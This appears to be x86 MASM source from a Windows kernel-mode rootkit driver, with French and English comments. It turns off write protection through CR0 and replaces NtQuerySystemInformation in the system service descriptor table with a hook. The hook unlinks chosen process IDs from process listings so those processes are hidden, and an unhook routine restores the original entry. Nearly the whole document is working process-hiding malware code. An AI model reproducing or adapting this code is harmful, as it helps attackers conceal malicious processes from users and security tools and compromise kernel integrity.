.code

UnProtect proc
    push eax
    cli
	mov eax, cr0
	and eax, not 10000h
	mov cr0, eax
	pop eax
	ret
UnProtect endp

Protect proc
    push eax
	mov	eax, cr0
    or eax, 10000h
    mov	cr0, eax
	sti
	pop eax
	ret
Protect endp


NativeApiIdFromApiAddress proc, pApiEntry : DWORD
	sub eax, eax
	dec eax                                                            ; fonction lame qui recupère le ID int 2Eh d'une fonction ntdll.
	mov esi, pApiEntry
	lodsb
	cmp al, 0B8h
	jz @F
	xor eax, eax
	ret
@@:
	lodsd
	ret
NativeApiIdFromApiAddress endp




;----------------------------------- Fonction qui traite les sorties de NtQuerySystemProcessInformation, si il s'agit effectivement d'un listage de process
HandleSystemProcessInfoOutput:
	mov     esi, dword ptr [esp+4]                                         ; ESI -> info blocks
	xor     edi, edi                                                       ; edi will save ptr to our spi ( system process info struct )
	xor     ebx, ebx       
HSPIO_loop:
  	assume esi:ptr NT4_SYSTEM_PROCESS_INFORMATION
  	mov eax, [esi].ProcessId
  	assume esi:NOTHING
  	mov edx, pPIDTable
  	xor ecx, ecx
PIDLoop:
  	cmp ax, word ptr [edx+ecx*2]   ; compares the processID retrieved from the API and our one.
  	jz ProcessFound
  	cmp ecx, PIDCount        ; continue ainsi avec chaque PID de notre table...
  	jae ProcessNextStruct
  	inc ecx
  	jmp PIDLoop                    ; checks another processid
ProcessNextStruct:
  	cmp dword ptr [esi], 0         ; end of blocks reached ? ( membre SizeOfBlock=0  )
  	jz HSPIO_loop_end
  	mov edi, esi               ; edi = ptr to previous block
  	add esi, [esi]             ; esi -> ptr to next block
  	jmp HSPIO_loop
ProcessFound:
  	mov ebx, [esi]             ; ebx == size of the current spi
  	cmp ebx, 0
  	jz MovSize
  	add dword ptr [edi], ebx
  	add esi, ebx
  	jmp HSPIO_loop
MovSize:
  	mov dword ptr [edi], 0
HSPIO_loop_end:
	ret 4

    MyFlag                         dd 'HOOK'        ; flag pour savoir si la fonction a deja ete hookée ou non.
    
NtQuerySystemInformationHook:
    ;int 3
    nop
    pushfd
	pushad
	lea edi, [esp + sizeof PUSHA_STRUCT + 4 + 4]                     ; EDI -> argument list
	; call the NT API
	push [edi+0Ch]                                                   ; push arguments
	push [edi+08h]                                                   
	push [edi+04h]                                                   
	push [edi]
	push offset erf
	jmp dword ptr [pOldNtOsNQSI]
erf:
	mov edx, eax                                                       ; EDX == call result
	xor eax, eax
	cmp edx, eax                                                       ; STATUS_SUCCESS ?
	jnz NQSIH_test_done
	cmp dword ptr [edi], 5                                             ; our target query class ?
	jnz NQSIH_test_done
    push edx
	push [edi+04h]
	call HandleSystemProcessInfoOutput
    pop edx
NQSIH_test_done:
    mov [esp].PUSHA_STRUCT._EAX, edx                                ; save EDX 2 popad'ed EAX
	popa
	popfd
	ret     4 * 4
NtQuerySystemInformationHookEnd:


;
; Purpose:      Hook the targets
;
; Return type:  void
;
EstablishHook proc uses esi edi ebx
;	int     3
	; test whether we've all needed information
	sub     eax, eax
	dec     eax                                                            ; eax == -1
	cmp     dwNQSI_NT_ID, eax
	jz      @@exit
	cmp     dwTargetPID, eax
	jz      @@exit

	; overwrite NQSI's API address in SSDT
	mov     eax, KeServiceDescriptorTable
	mov     edi, [eax]                                                     ; EDI -> ptr 2 SSDT
	mov     edx, dwNQSI_NT_ID                                              ; EDX == NQSI ID
	mov     ebx, offset NtQuerySystemInformationHook
	mov     edi, [edi].SSDT.pSSAT                                          ; EDI -> Native API addr chain
	call    UnProtect
	xchg    ebx, dword ptr [edi+4*edx]
	call    Protect
    mov     pOldNtOsNQSI, ebx	
@@exit:
	ret
EstablishHook ENDP

;
; Purpose:      Unhook the locations
;
; Return type:  void
;
UnhookSystem proc uses esi edi ebx
	xor     eax, eax
	cmp     pOldNtOsNQSI, eax
	jz      @@exit
	
	; rewrite NQSI API address in SSDT
	mov     eax, KeServiceDescriptorTable
	mov     eax, [eax]
	mov     eax, [eax].SSDT.pSSAT
	mov     edx, dwNQSI_NT_ID
	mov     ebx, pOldNtOsNQSI
	call    UnProtect
	mov     [eax + edx * 4], ebx
	call    Protect
@@exit:
	ret
UnhookSystem endp

